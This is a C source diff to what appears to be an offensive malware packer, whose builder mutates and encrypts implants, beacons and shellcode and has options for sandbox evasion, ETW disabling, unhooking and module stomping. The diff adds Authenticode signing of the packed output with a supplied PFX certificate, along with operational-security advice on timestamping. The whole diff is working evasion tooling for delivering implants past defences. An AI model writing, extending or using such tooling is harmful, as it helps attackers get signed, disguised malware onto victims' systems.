@@ -26,6 +26,7 @@
 #include "..\Engine\MutationEngine.h"
 #include "..\Engine\Xtea.h"
 #include "..\Engine\OpsecFlags.h"
+#include "PeSigning.h"
 
 #pragma comment(lib, "Crypt32.lib")
 
@@ -170,6 +171,9 @@ typedef struct {
     DWORD       uptimeMin;        /* --uptime-min     — 0 = use default 2 min     */
     DWORD       hammerMs;         /* --hammer-s       — 0 = use default 3000 ms   */
     DWORD       opsecFlags;       /* --disable / --overload / --keep-alive / --unhook */
+    const char* pfxPath;          /* --pfx       — NULL = no signing                  */
+    const char* pfxPass;          /* --pfx-pass  — NULL = no password (or empty PFX)  */
+    const char* tsUrl;            /* --ts-url    — NULL = sign without timestamp      */
 } BUILD_CONFIG;
 
 static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
@@ -187,6 +191,9 @@ static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
     cfg->uptimeMin        = 0;
     cfg->hammerMs         = 0;
     cfg->opsecFlags       = 0;
+    cfg->pfxPath          = NULL;
+    cfg->pfxPass          = NULL;
+    cfg->tsUrl            = NULL;
 }
 
 /* -------------------------------------------------------------------------
@@ -274,6 +281,15 @@ static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
         else if (_stricmp(argv[i], "--disable") == 0 && i + 1 < argc) {
             if (!ApplyDisableList(argv[++i], &cfg->opsecFlags)) return FALSE;
         }
+        else if (_stricmp(argv[i], "--pfx") == 0 && i + 1 < argc) {
+            cfg->pfxPath = argv[++i];
+        }
+        else if (_stricmp(argv[i], "--pfx-pass") == 0 && i + 1 < argc) {
+            cfg->pfxPass = argv[++i];
+        }
+        else if (_stricmp(argv[i], "--ts-url") == 0 && i + 1 < argc) {
+            cfg->tsUrl = argv[++i];
+        }
         else {
             printf("[!] Unknown option: %s\n", argv[i]);
             return FALSE;
@@ -328,12 +344,25 @@ static void PrintUsage(void) {
     PrintDisableGroup(DGROUP_SANDBOX);
     printf("    %-11s %s\n", "all", "Disable every token listed above");
     printf("\n");
+    printf("Authenticode signing (via mssign32!SignerSignEx2, no signtool dependency):\n");
+    printf("  --pfx <path>               PFX certificate container to sign the output with\n");
+    printf("  --pfx-pass <password>      PFX passphrase  [omit if PFX has no password]\n");
+    printf("  --ts-url <url>             RFC 3161 timestamp URL  [default: no timestamping]\n");
+    printf("                             OPSEC: timestamping reveals build IP/time to the TSA.\n");
+    printf("                             Enable only when signing from an isolated VM, or when\n");
+    printf("                             you need the signature to survive cert revocation.\n");
+    printf("                             Common URLs: http://timestamp.digicert.com\n");
+    printf("                                          http://timestamp.sectigo.com\n");
+    printf("                                          http://timestamp.globalsign.com/tsa/r6advanced1\n");
+    printf("\n");
     printf("Examples:\n");
     printf("  Builder.exe implant.exe     packed.exe\n");
     printf("  Builder.exe shellcode.bin   packed.exe --keep-alive\n");
     printf("  Builder.exe beacon.dll      packed.exe --export Start --keep-alive\n");
     printf("  Builder.exe payload.dll     packed.exe --export Execute --arg \"calc.exe\"\n");
     printf("  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls\n");
+    printf("  Builder.exe implant.exe     packed.exe --pfx cert.pfx --pfx-pass hunter2\n");
+    printf("  Builder.exe implant.exe     packed.exe --pfx cert.pfx --ts-url http://timestamp.digicert.com\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -614,17 +643,34 @@ int main(int argc, char* argv[]) {
   printf("[*] Phase 8: Building Final PE...\n");
   printf("[*] Module-stomp preset: DLL pool indices [%u, %u, %u]\n",
          cfg.dll_indices[0], cfg.dll_indices[1], cfg.dll_indices[2]);
-  if (BuildInfectedPE(cfg.stubPath, cfg.outputPath,
-                      mutated.pBuffer, mutated.totalSize,
-                      rawTargetSize, (DWORD)mutated.stubSize,
-                      key_salt, cfg.dll_indices,
-                      exportHash, cfg.exportArg,
-                      cfg.spoofExe,
-                      cfg.semaphoreName[0] ? cfg.semaphoreName : NULL,
-                      cfg.sleepFwdMs,
-                      cfg.uptimeMin,
-                      cfg.hammerMs,
-                      cfg.opsecFlags)) {
+  BOOL bBuildOk = BuildInfectedPE(cfg.stubPath, cfg.outputPath,
+                                  mutated.pBuffer, mutated.totalSize,
+                                  rawTargetSize, (DWORD)mutated.stubSize,
+                                  key_salt, cfg.dll_indices,
+                                  exportHash, cfg.exportArg,
+                                  cfg.spoofExe,
+                                  cfg.semaphoreName[0] ? cfg.semaphoreName : NULL,
+                                  cfg.sleepFwdMs,
+                                  cfg.uptimeMin,
+                                  cfg.hammerMs,
+                                  cfg.opsecFlags);
+
+  /* STEP 9: Optional Authenticode signing — must come AFTER BuildInfectedPE
+   * because signing rewrites the PE security directory and recalculates the
+   * checksum; any further resource edits would invalidate the signature. */
+  if (bBuildOk && cfg.pfxPath) {
+      printf("[*] Phase 9: Authenticode signing (PFX: %s%s)\n",
+             cfg.pfxPath,
+             cfg.tsUrl ? ", with RFC 3161 timestamp" : ", no timestamp");
+      if (SignPeWithPfx(cfg.outputPath, cfg.pfxPath, cfg.pfxPass, cfg.tsUrl)) {
+          printf("[+] Signed successfully\n");
+      } else {
+          fprintf(stderr, "[!] Signing failed - output PE is unsigned but otherwise valid\n");
+          bBuildOk = FALSE;
+      }
+  }
+
+  if (bBuildOk) {
       printf("\n[+] === You're good to go! Build finished. ===\n");
       printf("[+] Saved as: %s\n", cfg.outputPath);
   } else {
